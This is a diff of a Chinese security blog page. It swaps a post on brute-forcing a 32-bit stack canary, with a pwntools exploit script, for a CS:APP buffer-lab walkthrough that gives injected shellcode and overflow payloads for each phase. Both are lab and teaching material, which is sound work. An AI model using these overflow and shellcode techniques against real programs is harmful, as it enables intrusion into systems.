@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Bypass-Canary系列-one-by-one-爆破 | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" Bypass-Canary ">
-  <meta name="description" content="Bypass-Canary系列-one-by-one-爆破 | sixpar&#39;s blog">
+  <title>天问计划week11-day2 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" 天问计划 ">
+  <meta name="description" content="天问计划week11-day2 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -724,9 +724,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Bypass-Canary系列-one-by-one-爆破" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-天问计划week11-day2" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Bypass-Canary系列-one-by-one-爆破</h1>
+        <h1 class="article-title">天问计划week11-day2</h1>
     
     <div class="article-meta">
         
@@ -744,19 +744,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color4">Bypass-Canary</a>
+            <a class="color5">天问计划</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-05 09:26:42'>2020-07-04 23:26</time>
+            Created At : <time class="date" title='Updated At: 2020-07-28 22:51:58'>2020-07-28 09:40</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:866</span>
+        <span>Count:4.4k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -786,7 +786,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#说明"><span class="toc-text">说明:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例题（-Bypass-Canary-bin1）："><span class="toc-text">*例题（&#x2F;Bypass-Canary&#x2F;bin1）：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp："><span class="toc-text">exp：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#buffer-lab："><span class="toc-text">buffer lab：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实验文档手册："><span class="toc-text">实验文档手册：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-phase1："><span class="toc-text">1.phase1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-phase2："><span class="toc-text">2.phase2：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-phase3："><span class="toc-text">3.phase3：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-phase4："><span class="toc-text">4.phase4：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-phase5："><span class="toc-text">5.phase5：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于buffer-lab的总结："><span class="toc-text">关于buffer lab的总结：</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -802,68 +802,387 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>这是本系列的第三篇文章，我们根据前面学过的内容我们知道了，如果在溢出的时候算准位置将Canary的值填回去便可以绕过限制。本篇将介绍如何通过逐字节爆破得到Canary的值。</p>
-</blockquote>
-<h2 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h2><blockquote>
-<p>●本方法只适用于32位程序。为什么呢，32位程序地址是4字节，而Canary的低字节永远是”\x00”我们是知道的，所以实际只需要爆破 3 字节即可。</p>
-</blockquote>
-<p>所以现在明白为什么爆破法不能适用于64位程序了吧，8字节的地址，那得爆破到什么时候去。</p>
-<blockquote>
-<p>●本方法还有一个关键前提是程序中得有一个 fork() 函数。</p>
-</blockquote>
-<p>fork()函数是用来创建子进程的。美汁汁儿~<br>注意：父进程通过 fork 函数创建的子进程的 Canary 也是相同的，fork 函数会直接拷贝父进程的内存。</p>
-<blockquote>
-<p>●借助栈溢出漏洞，使得能覆盖到canary的地址。</p>
-</blockquote>
-<p>因此我们就可以覆盖Canary，不断试错，试对了就进入下一个字节的爆破，所以就逐个字节地将 Canary 爆破出来</p>
-<h2 id="例题（-Bypass-Canary-bin1）："><a href="#例题（-Bypass-Canary-bin1）：" class="headerlink" title="*例题（/Bypass-Canary/bin1）："></a>*例题（/Bypass-Canary/bin1）：</h2><p>file指令查看过了，是32位程序。<br>IDA分析程序，发现了main中有 fork() 函数：</p>
-<blockquote>
-<p>v3 = fork();</p>
-</blockquote>
-<p>fun函数中存在溢出漏洞。buf大小是0x70，而我们可以输入0x78。</p>
-<p>3个条件都具备了，可以利用爆破手段爆出Canary的值了。</p>
-<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><pre><code class="python">#!/usr/bin/python3
-#coding=utf-8
-from pwn import *
-p=process(&#39;./bin1&#39;)
-context.log_level=&#39;debug&#39;
-canary_addr=&#39;\x00&#39; 
-#低字节是\x00，我们是确定的，所以接下来只需要爆破剩余的3字节即可。
-
-p.recvuntil(&#39;welcome\n&#39;)
-for i in range(3):   #3次
-    for x in range(256):
-        p.send(&#39;a&#39;*100+canary_addr+chr(x))   #不断试错
-        get=p.recvuntil(&quot;welcome\n&quot;)
-        if &#39;recv&#39; in get:
-            canary_addr+=chr(x)
-            break
-
-getflag=0x0804863B
-payload=&#39;a&#39;*(0x70-0xc)+ canary_addr +&#39;a&#39;*12+p32(getflag)  
-#0xc是存储Canary的地方，所以我们需要填充(0x70-0xc)个字节垃圾数据。
-#这里的canary的地址不用p32打包,因为爆破出来后没有作任何处理直接拿来用了，已经是小端序形式了。
-p.sendline(payload)
-p.interactive()
+        <h2 id="buffer-lab："><a href="#buffer-lab：" class="headerlink" title="buffer lab："></a>buffer lab：</h2><p>文件说明：</p>
+<p>bufbomb：攻击目标文件，使用举例：./bufbomb -u sixpar</p>
+<p>makecookie：根据每个用户输入的userid生成每个用户专属的cookie（4字节数据），也就是说不同的userid对应不同的结果。使用举例： ./makecookie sixpar</p>
+<p>hex2raw：将十六进制的数据转为普通字符以便于输入</p>
+<h3 id="实验文档手册："><a href="#实验文档手册：" class="headerlink" title="实验文档手册："></a>实验文档手册：</h3><p>根据实验文档手册，如下：</p>
+<pre><code class="c">1 /* Buffer size for getbuf */
+2 #define NORMAL_BUFFER_SIZE 32 
+3
+4 int getbuf()
+5 {
+6 char buf[NORMAL_BUFFER_SIZE];
+7 Gets(buf);
+8 return 1;
+9 }
 </code></pre>
-<p>执行结果截图：<br><img src="https://i.loli.net/2020/07/04/N3pefMnzWljuArR.jpg" alt="本地"></p>
-<p>注意每一次运行程序的Canary值都是不一样的，这一次爆破出来的结果是 00 9f 21 af，因此canary的值为0xaf219f00</p>
-<p>可以看到图片下方出现”get flag error”字样，这个不用管，由于我们本地路径下没有这个文件，因此调用后门函数读取不到文件是很正常的事，exp没有问题，打远程的话，远程机子上一定会在指定目录下设置好flag文件的。</p>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>关键代码：</p>
-<pre><code class="python">for i in range(3):   
-    for x in range(256):
-        p.send(&#39;a&#39;*100+canary_addr+chr(x)) 
-        get=p.recvuntil(&quot;welcome\n&quot;)
-        if &#39;recv&#39; in get:
-            canary_addr+=chr(x)
-            break</code></pre>
-<p>由于程序有fork函数，所以我们可以不断覆盖canary进行试错，错误了就触发警报退出进程，那就再fork一个子进程继续试，试对了就进入下一个字节的爆破，然后就逐个字节地将 Canary 值爆破出来。然后老样子溢出构造payload。</p>
+<p>我们知道了程序中调用了getbuf()函数，而getbuf函数实际又调用了gets函数，这个函数以’\n’作为数据输入结束标记。因此它只知道读取，不知道buf能不能承受那么多的数据，所以很容易存在溢出问题。</p>
+<p>根据定义，buf的size为32字节。当输入的数据不超出buf的size时，Gets函数调用后会return 0x1，否则溢出则会造成错误：segmentation fault！</p>
+<h3 id="1-phase1："><a href="#1-phase1：" class="headerlink" title="1.phase1："></a>1.phase1：</h3><p>目标是执行smoke，而不是让getbuf()返回1</p>
+<p>溢出getbuf()函数，然后把test()的返回地址填为smoke()函数起始地址。</p>
+<pre><code class="c">gdb-peda$ disassemble getbuf
+Dump of assembler code for function getbuf:
+   0x080491f4 &lt;+0&gt;:        push   ebp
+   0x080491f5 &lt;+1&gt;:        mov    ebp,esp
+   0x080491f7 &lt;+3&gt;:        sub    esp,0x38
+   0x080491fa &lt;+6&gt;:        lea    eax,[ebp-0x28]
+   0x080491fd &lt;+9&gt;:        mov    DWORD PTR [esp],eax
+   0x08049200 &lt;+12&gt;:    call   0x8048cfa &lt;Gets&gt;
+   0x08049205 &lt;+17&gt;:    mov    eax,0x1
+   0x0804920a &lt;+22&gt;:    leave  
+   0x0804920b &lt;+23&gt;:    ret    
+</code></pre>
+<p>Gets函数的返回值存储在 ebp-0x28 的位置，该地址即存储buf字符串的起始地址。</p>
+<p>所以知道getbuf的栈大小为0x28（40）个字节。</p>
+<p>而smoke的的起始地址为0x8048c18，所以就这样咯。40字节+ebp的a字节都填充掉。然后把原本test()的返回地址覆盖为smoke()地址</p>
+<p>结果：</p>
+<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ cat phase1.txt | ./bufbomb -u sixpar
+Userid: sixpar
+Cookie: 0x171ae53c
+Type string:Smoke!: You called smoke()
+VALID
+NICE JOB!</code></pre>
+<h3 id="2-phase2："><a href="#2-phase2：" class="headerlink" title="2.phase2："></a>2.phase2：</h3><p>这一回，实验要求返回到 fizz()函数。</p>
+<pre><code class="c">gdb-peda$ disassemble fizz
+Dump of assembler code for function fizz:
+   0x08048c42 &lt;+0&gt;:        push   ebp
+   0x08048c43 &lt;+1&gt;:        mov    ebp,esp
+   0x08048c45 &lt;+3&gt;:        sub    esp,0x18
+   0x08048c48 &lt;+6&gt;:        mov    eax,DWORD PTR [ebp+0x8]
+   0x08048c4b &lt;+9&gt;:        cmp    eax,DWORD PTR ds:0x804d108
+   0x08048c51 &lt;+15&gt;:    jne    0x8048c79 &lt;fizz+55&gt;
+   0x08048c53 &lt;+17&gt;:    mov    DWORD PTR [esp+0x8],eax
+   0x08048c57 &lt;+21&gt;:    mov    DWORD PTR [esp+0x4],0x804a4ee
+   0x08048c5f &lt;+29&gt;:    mov    DWORD PTR [esp],0x1
+   0x08048c66 &lt;+36&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
+   0x08048c6b &lt;+41&gt;:    mov    DWORD PTR [esp],0x1
+   0x08048c72 &lt;+48&gt;:    call   0x804937b &lt;validate&gt;
+   0x08048c77 &lt;+53&gt;:    jmp    0x8048c91 &lt;fizz+79&gt;
+   0x08048c79 &lt;+55&gt;:    mov    DWORD PTR [esp+0x8],eax
+   0x08048c7d &lt;+59&gt;:    mov    DWORD PTR [esp+0x4],0x804a340
+   0x08048c85 &lt;+67&gt;:    mov    DWORD PTR [esp],0x1
+   0x08048c8c &lt;+74&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
+   0x08048c91 &lt;+79&gt;:    mov    DWORD PTR [esp],0x0
+   0x08048c98 &lt;+86&gt;:    call   0x8048900 &lt;exit@plt&gt;</code></pre>
+<p>可以看到0x08048c4b这一行，程序会把eax（我们传入的参数val）和 ds:0x804d108 处的值进行比对。</p>
+<p>猜测0x804d108处存的就是cookie的值。</p>
+<p>调试一下，使用 r -u sixpar 运行程序，然后什么都不用干，直接截断。</p>
+<p>然后查看：</p>
+<pre><code class="c">gdb-peda$ x/10xw 0x804d108
+0x804d108 &lt;cookie&gt;:    0x171ae53c    0xf7fb15a0    0x00000000    0x00000000</code></pre>
+<p>发现这个地方果然存储着属于我sixpar用户的cookie： 0x171ae53c</p>
+<p>eax则取 [ebp+0x8] 的值。所以我们溢出，把ebp+0x8的位置覆盖为正确的cookie值就行了啊。</p>
+<p>这里注意的是哪个ebp。</p>
+<p>由于返回地址填为了fizz()，所以最后pop fizz的起始地址到eip然后跳转执行。</p>
+<p>fizz函数的开头会 push ebp，然后mov esp,ebp，使得在<code>原先返回地址的位置</code>上又开启了一个新的栈帧（虽然栈帧还是空的，esp和ebp还是指向同一地方的），所以当执行到取ebp+0x8的位置的值的语句的时候，这里的ebp指的是新的ebp。新的ebp+0x8</p>
+<p>所以照此思路，我们构造payload时，也要在原先<code>返回的地址的后面的0x8的位置</code>上放cookie的值才行。</p>
+<p>这也就是为什么返回地址和cookie值之间还多出来4字节数据的原因。（我一开始还没搞懂hhh）</p>
+<p>所以最终构造如下：</p>
+<pre><code class="c">0000000000000000
+0000000000000000
+0000000000000000    
+0000000000000000    
+00000000428C0408
+000000003Ce51a17    </code></pre>
+<p>结果：</p>
+<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ cat phase2.txt | ./bufbomb -u sixpar
+Userid: sixpar
+Cookie: 0x171ae53c
+Type string:Fizz!: You called fizz(0x171ae53c)
+VALID
+NICE JOB!</code></pre>
+<h3 id="3-phase3："><a href="#3-phase3：" class="headerlink" title="3.phase3："></a>3.phase3：</h3><p>返回到bang()函数。本题需要植入机器码，修改 global_value 为 cookies 的值。</p>
+<p>bang函数如下：</p>
+<pre><code class="c">gdb-peda$ disassemble bang
+Dump of assembler code for function bang:
+   0x08048c9d &lt;+0&gt;:        push   ebp
+   0x08048c9e &lt;+1&gt;:        mov    ebp,esp
+   0x08048ca0 &lt;+3&gt;:        sub    esp,0x18
+   0x08048ca3 &lt;+6&gt;:        mov    eax,ds:0x804d100
+   0x08048ca8 &lt;+11&gt;:    cmp    eax,DWORD PTR ds:0x804d108
+   0x08048cae &lt;+17&gt;:    jne    0x8048cd6 &lt;bang+57&gt;
+   0x08048cb0 &lt;+19&gt;:    mov    DWORD PTR [esp+0x8],eax
+   0x08048cb4 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],0x804a360
+   0x08048cbc &lt;+31&gt;:    mov    DWORD PTR [esp],0x1
+   0x08048cc3 &lt;+38&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
+   0x08048cc8 &lt;+43&gt;:    mov    DWORD PTR [esp],0x2
+   0x08048ccf &lt;+50&gt;:    call   0x804937b &lt;validate&gt;
+   0x08048cd4 &lt;+55&gt;:    jmp    0x8048cee &lt;bang+81&gt;
+   0x08048cd6 &lt;+57&gt;:    mov    DWORD PTR [esp+0x8],eax
+   0x08048cda &lt;+61&gt;:    mov    DWORD PTR [esp+0x4],0x804a50c
+   0x08048ce2 &lt;+69&gt;:    mov    DWORD PTR [esp],0x1
+   0x08048ce9 &lt;+76&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
+   0x08048cee &lt;+81&gt;:    mov    DWORD PTR [esp],0x0
+   0x08048cf5 &lt;+88&gt;:    call   0x8048900 &lt;exit@plt&gt;</code></pre>
+<p>可见它会把0x804d108处的值给eax，然后比较eax和cookie值是否相等。</p>
+<p>我们查看一下0x804d108：</p>
+<pre><code class="c">gdb-peda$ x/10xw 0x804d100
+0x804d100 &lt;global_value&gt;:    0x00000000    0x00000000    0x171ae53c    0xf7fb15a0</code></pre>
+<p>发现存储的是 global_value变量的地址。而不远处的0x171ae53c刚好存储着正确的cookie的值。</p>
+<p>我们的想法就是注入代码，然后修改global_value变量的值。并且把bang函数的起始地址压入栈，随后ret。</p>
+<p>所以得到的注入代码如下：</p>
+<pre><code class="c">movl $0x171ae53c,%eax
+movl %eax,0x804d100
+pushl $0x08048c9d
+ret</code></pre>
+<p>然后将汇编文件转为机器码。</p>
+<p>gcc -m32 -c phase3.s   ，注意加 -m 32 ，因为这是32位的程序。</p>
+<p>得到：</p>
+<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ objdump -d phase3.o
+
+phase3.o：     文件格式 elf32-i386
+
+Disassembly of section .text:
+
+00000000 &lt;.text&gt;:
+   0:    b8 3c e5 1a 17           mov    $0x171ae53c,%eax
+   5:    a3 00 d1 04 08           mov    %eax,0x804d100
+   a:    68 9d 8c 04 08           push   $0x8048c9d
+   f:    c3                       ret   </code></pre>
+<p>所以机器码就是：</p>
+<pre><code class="c">b8 3c e5 1a 17 a3 00 d1 04 08 68 9d 8c 04 08 c3</code></pre>
+<p>把这串shellcode写在栈首地址，然后返回地址填栈的首地址就可啦。</p>
+<p>对了，说到栈的首地址，这里还是重复一遍吧。</p>
+<p>gdb调试，然后在getbuf函数中的call Gets处下断点，b *0x8049200</p>
+<p>然后r运行起来，自动断在Gets处，然后ni下一步，随便输入aaaaaa，然后就可以看到栈中：</p>
+<p>0x55683e18 (“aaaaaaaa”)</p>
+<p>说明0x55683e18 就是栈的首地址，它同时也是字符串指针指向字符串。</p>
+<p>最终payload数据为：</p>
+<pre><code class="c">B83CE51A17A300D1
+0408689D8C0408C3
+0000000000000000
+0000000000000000
+0000000000000000
+00000000183E6855</code></pre>
+<p>结果：</p>
+<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ cat phase3.txt | ./bufbomb -u sixpar
+Userid: sixpar
+Cookie: 0x171ae53c
+Type string:Bang!: You set global_value to 0x171ae53c
+VALID
+NICE JOB!</code></pre>
+<h3 id="4-phase4："><a href="#4-phase4：" class="headerlink" title="4.phase4："></a>4.phase4：</h3><p>本题要求我们注入一段能够修改 getbuf 返回值的代码，把返回值从 1 改成 cookie 值，此外还需要还原所有破坏，继续运行 test 程序的剩下部分。</p>
+<p>继续上汇编：</p>
+<p>getbuf():</p>
+<pre><code class="c">gdb-peda$ disassemble getbuf
+Dump of assembler code for function getbuf:
+   0x080491f4 &lt;+0&gt;:        push   ebp
+   0x080491f5 &lt;+1&gt;:        mov    ebp,esp
+   0x080491f7 &lt;+3&gt;:        sub    esp,0x38
+   0x080491fa &lt;+6&gt;:        lea    eax,[ebp-0x28]
+   0x080491fd &lt;+9&gt;:        mov    DWORD PTR [esp],eax
+   0x08049200 &lt;+12&gt;:    call   0x8048cfa &lt;Gets&gt;
+   0x08049205 &lt;+17&gt;:    mov    eax,0x1
+   0x0804920a &lt;+22&gt;:    leave  
+   0x0804920b &lt;+23&gt;:    ret    </code></pre>
+<p>注意到在 Gets 之后，eax 会被修改为 1，所以在正常情况下函数总会返回 1。而为了改变这一行需要我们手动修改 eax 为 coockie，所以需要注入一段代码，首先手动设置 eax 为 cookie，然后将返回地址设置为 test 在调用了 getbuf 之后的下一行 0x08048dbe</p>
+<p>test():</p>
+<pre><code class="c">gdb-peda$ disassemble test
+Dump of assembler code for function test:
+   0x08048daa &lt;+0&gt;:        push   ebp
+   0x08048dab &lt;+1&gt;:        mov    ebp,esp
+   0x08048dad &lt;+3&gt;:        push   ebx
+   0x08048dae &lt;+4&gt;:        sub    esp,0x24
+   0x08048db1 &lt;+7&gt;:        call   0x8048d90 &lt;uniqueval&gt;
+   0x08048db6 &lt;+12&gt;:    mov    DWORD PTR [ebp-0xc],eax
+   0x08048db9 &lt;+15&gt;:    call   0x80491f4 &lt;getbuf&gt;  //调用 getbuf 
+   0x08048dbe &lt;+20&gt;:    mov    ebx,eax   //劫持getbuf修改eax的值，手动令getbuf结束时跳转到这里
+   0x08048dc0 &lt;+22&gt;:    call   0x8048d90 &lt;uniqueval&gt;
+   0x08048dc5 &lt;+27&gt;:    mov    edx,DWORD PTR [ebp-0xc]
+   0x08048dc8 &lt;+30&gt;:    cmp    eax,edx
+   0x08048dca &lt;+32&gt;:    je     0x8048dda &lt;test+48&gt;
+   0x08048dcc &lt;+34&gt;:    mov    DWORD PTR [esp],0x804a388
+   0x08048dd3 &lt;+41&gt;:    call   0x80488c0 &lt;puts@plt&gt;
+   0x08048dd8 &lt;+46&gt;:    jmp    0x8048e20 &lt;test+118&gt;
+   0x08048dda &lt;+48&gt;:    cmp    ebx,DWORD PTR ds:0x804d108
+   0x08048de0 &lt;+54&gt;:    jne    0x8048e08 &lt;test+94&gt;
+   0x08048de2 &lt;+56&gt;:    mov    DWORD PTR [esp+0x8],ebx
+   0x08048de6 &lt;+60&gt;:    mov    DWORD PTR [esp+0x4],0x804a52a
+   0x08048dee &lt;+68&gt;:    mov    DWORD PTR [esp],0x1
+   0x08048df5 &lt;+75&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
+   0x08048dfa &lt;+80&gt;:    mov    DWORD PTR [esp],0x3
+   0x08048e01 &lt;+87&gt;:    call   0x804937b &lt;validate&gt;
+   0x08048e06 &lt;+92&gt;:    jmp    0x8048e20 &lt;test+118&gt;
+   0x08048e08 &lt;+94&gt;:    mov    DWORD PTR [esp+0x8],ebx
+   0x08048e0c &lt;+98&gt;:    mov    DWORD PTR [esp+0x4],0x804a547
+   0x08048e14 &lt;+106&gt;:    mov    DWORD PTR [esp],0x1
+   0x08048e1b &lt;+113&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
+   0x08048e20 &lt;+118&gt;:    add    esp,0x24
+   0x08048e23 &lt;+121&gt;:    pop    ebx
+   0x08048e24 &lt;+122&gt;:    pop    ebp
+   0x08048e25 &lt;+123&gt;:    ret </code></pre>
+<p>注入代码如下：</p>
+<pre><code class="c">movl $0x171ae53c,%eax
+pushl $0x08048dbe
+ret</code></pre>
+<p>机器码为：</p>
+<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ objdump -d phase4.o
+
+phase4.o：     文件格式 elf32-i386
+
+Disassembly of section .text:
+
+00000000 &lt;.text&gt;:
+   0:    b8 3c e5 1a 17           mov    $0x171ae53c,%eax
+   5:    68 be 8d 04 08           push   $0x8048dbe
+   a:    c3                       ret </code></pre>
+<p>即机器码为：</p>
+<pre><code class="c">b8 3c e5 1a 17 68 be 8d 04 08 c3</code></pre>
+<p>而本题值得注意的是：</p>
+<p>为了使得test()能够继续执行下去，所以旧的ebp的值必须保留。（test是父函数，所以test()的ebp相比较于getbuf的ebp是旧的ebp了）。</p>
+<p>所以在getbuf处溢出的时候记得把 40-44 字节的ebp数据给填回去，使得能够回到test的栈帧里继续完好运行。</p>
+<p>那ebp的值怎么得到呢？</p>
+<p>gdb中在 getbuf 的第一行 0x080491f4 处下断点，因为getbuf的第一句就是push压栈，保存旧栈帧test的ebp值。</p>
+<p>查看得到此时 ebp 的值为： 0x55683e70</p>
+<p><code>ebp此时内心独白：&quot;没想到我也有被重视的那一天！呜呜&quot;</code></p>
+<p>且经过调试，栈首地址为：0x55683e18</p>
+<p>所以最终的payload数据为：</p>
+<pre><code class="c">B83CE51A1768BE8D
+0408C30000000000
+0000000000000000
+0000000000000000
+0000000000000000
+703E6855183E6855</code></pre>
+<p>结果：成功！</p>
+<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ cat phase4.txt | ./bufbomb -u sixpar
+Userid: sixpar
+Cookie: 0x171ae53c
+Type string:Boom!: getbuf returned 0x171ae53c
+VALID
+NICE JOB!</code></pre>
+<h3 id="5-phase5："><a href="#5-phase5：" class="headerlink" title="5.phase5："></a>5.phase5：</h3><p>使用 -n 参数运行 bufbomb（实际会运行testn函数体而不是test函数体了），程序会开启栈随机化来组织攻击代码。因此需要绕过栈随机化。</p>
+<p>因此本题是testn函数和getbufn函数，且栈大小有0x208（520）字节。</p>
+<p>并且实验手册上写着说是会调用getbufn函数 5次，我是看不出来为什么会调用5次的?代码看不出啥名堂。</p>
+<p>我需要连续输入五次正确的字符串，程序将会对每一次输入调用testn函数后调用getbufn函数，其中由于加入了对栈帧的扰动，栈帧的绝对位置会发生变化，因此不能再像上一个任务那样记下ebp的值再恢复。那么，如何在调用攻击代码时正确地恢复ebp的值，并让getbufn函数返回值为cookie，并且返回到testn函数呢？</p>
+<p>首先，我们来看testn和getbufn的代码。</p>
+<pre><code class="c">gdb-peda$ disassemble testn
+Dump of assembler code for function testn:
+   0x08048e26 &lt;+0&gt;:        push   ebp
+   0x08048e27 &lt;+1&gt;:        mov    ebp,esp
+   0x08048e29 &lt;+3&gt;:        push   ebx  //esp-=0x4
+   0x08048e2a &lt;+4&gt;:        sub    esp,0x24  //esp-=0x24
+   0x08048e2d &lt;+7&gt;:        call   0x8048d90 &lt;uniqueval&gt;
+   0x08048e32 &lt;+12&gt;:    mov    DWORD PTR [ebp-0xc],eax
+   0x08048e35 &lt;+15&gt;:    call   0x804920c &lt;getbufn&gt;
+   0x08048e3a &lt;+20&gt;:    mov    ebx,eax      //getbuf函数返回到这里
+   0x08048e3c &lt;+22&gt;:    call   0x8048d90 &lt;uniqueval&gt;
+   0x08048e41 &lt;+27&gt;:    mov    edx,DWORD PTR [ebp-0xc]
+   0x08048e44 &lt;+30&gt;:    cmp    eax,edx
+   0x08048e46 &lt;+32&gt;:    je     0x8048e56 &lt;testn+48&gt;
+   0x08048e48 &lt;+34&gt;:    mov    DWORD PTR [esp],0x804a388
+   0x08048e4f &lt;+41&gt;:    call   0x80488c0 &lt;puts@plt&gt;
+   0x08048e54 &lt;+46&gt;:    jmp    0x8048e9c &lt;testn+118&gt;
+   0x08048e56 &lt;+48&gt;:    cmp    ebx,DWORD PTR ds:0x804d108
+   0x08048e5c &lt;+54&gt;:    jne    0x8048e84 &lt;testn+94&gt;
+   0x08048e5e &lt;+56&gt;:    mov    DWORD PTR [esp+0x8],ebx
+   0x08048e62 &lt;+60&gt;:    mov    DWORD PTR [esp+0x4],0x804a3b4
+   0x08048e6a &lt;+68&gt;:    mov    DWORD PTR [esp],0x1
+   0x08048e71 &lt;+75&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
+   0x08048e76 &lt;+80&gt;:    mov    DWORD PTR [esp],0x4
+   0x08048e7d &lt;+87&gt;:    call   0x804937b &lt;validate&gt;
+   0x08048e82 &lt;+92&gt;:    jmp    0x8048e9c &lt;testn+118&gt;
+   0x08048e84 &lt;+94&gt;:    mov    DWORD PTR [esp+0x8],ebx
+   0x08048e88 &lt;+98&gt;:    mov    DWORD PTR [esp+0x4],0x804a562
+   0x08048e90 &lt;+106&gt;:    mov    DWORD PTR [esp],0x1
+   0x08048e97 &lt;+113&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
+   0x08048e9c &lt;+118&gt;:    add    esp,0x24
+   0x08048e9f &lt;+121&gt;:    pop    ebx
+   0x08048ea0 &lt;+122&gt;:    pop    ebp
+   0x08048ea1 &lt;+123&gt;:    ret    </code></pre>
+<p>getbufn:</p>
+<pre><code class="c">gdb-peda$ disassemble getbufn
+Dump of assembler code for function getbufn:
+   0x0804920c &lt;+0&gt;:        push   ebp
+   0x0804920d &lt;+1&gt;:        mov    ebp,esp   //ebp=esp
+   0x0804920f &lt;+3&gt;:        sub    esp,0x218  //esp-=520
+   0x08049215 &lt;+9&gt;:        lea    eax,[ebp-0x208]  //esp-=12
+   0x0804921b &lt;+15&gt;:    mov    DWORD PTR [esp],eax  //eax=ebp-520
+   0x0804921e &lt;+18&gt;:    call   0x8048cfa &lt;Gets&gt;
+   0x08049223 &lt;+23&gt;:    mov    eax,0x1
+   0x08049228 &lt;+28&gt;:    leave  
+   0x08049229 &lt;+29&gt;:    ret </code></pre>
+<p>虽然我们在写字符串的过程中会覆盖掉旧的ebp，使得getbufn结束跳转到攻击代码时ebp的值不能正常恢复，但在getbufn的最后，会有leave语句，即 mov esp,ebp。</p>
+<p>覆盖掉了ebp没有关系，反正还有esp，只见esp已经被正常恢复到testn调用getbufn之前的状态，而testn中，esp = ebp - 24，所以只需恢复ebp到esp + 24。</p>
+<p>看到testn开头部分的代码：</p>
+<p>ebp与esp在同一个起跑线，然后push了一个ebx，所以esp要减去0x4，再手动分配0x24空间，所以esp又要减去0x24，所以与一开始的ebp比起来要少 (0x24+0x4) 字节。</p>
+<p>所以如果这时候<code>esp+0x28</code>，那么就可以得到调用getbufn函数之前的时候ebp的值啦（也就是我们压入栈帧里的那个ebp啦）。我们覆盖了ebp没关系，反正找到其源头就可。</p>
+<p>所以插入的汇编代码如下：</p>
+<pre><code class="c">lea 0x28(%esp),%ebp
+mov $0x171ae53c,%eax
+push $0x08048e3a
+ret</code></pre>
+<p>解释：溢出之后恢复ebp的值，然后构造返回值eax为cookie，随后返回到testn中调用getbufn函数的下一行。</p>
+<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ objdump -d phase5.o
+
+phase5.o：     文件格式 elf32-i386
+
+Disassembly of section .text:
+
+00000000 &lt;.text&gt;:
+   0:    8d 6c 24 28              lea    0x28(%esp),%ebp
+   4:    b8 3c e5 1a 17           mov    $0x171ae53c,%eax
+   9:    68 3a 8e 04 08           push   $0x8048e3a
+   e:    c3                       ret </code></pre>
+<p>得到机器码为：</p>
+<pre><code class="c">8d 6c 24 28 b8 3c e5 1a 17 68 3a 8e 04 08 c3</code></pre>
+<p>本题由于开启了随机化，所以不知道我们的栈首地址在哪，所以我们的shellcode语句要分布在哪呢。</p>
+<p>几个栈起始地址：</p>
+<p>0x55686438</p>
+<p>首先我们得得知大概的起始地址范围：</p>
+<p>gdb打开程序，然后在 0x8049215 处下断点，为什么要在这里下断点呢？</p>
 <blockquote>
-<p>payload = ‘a’ * paddings + canary_addr + ‘a’ * 12 + p32(return_addr)</p>
+<p>0x08049215 &lt;+9&gt;:    lea    eax,[ebp-0x208]</p>
 </blockquote>
-<p>注意canary之后要填充12字节的垃圾数据才到返回地址。</p>
-<p>芜湖，终于写完了。<br>–2020.7.5 0:09  &emsp;晚安</p>
+<p>该语句是在调用Gets函数前的准备语句，可以看到此时它会将栈的起始地址即ebp-0x208加载给eax，所以我们就可以查看此时的栈的起始地址了。</p>
+<blockquote>
+<p>r -n -u sixpar</p>
+</blockquote>
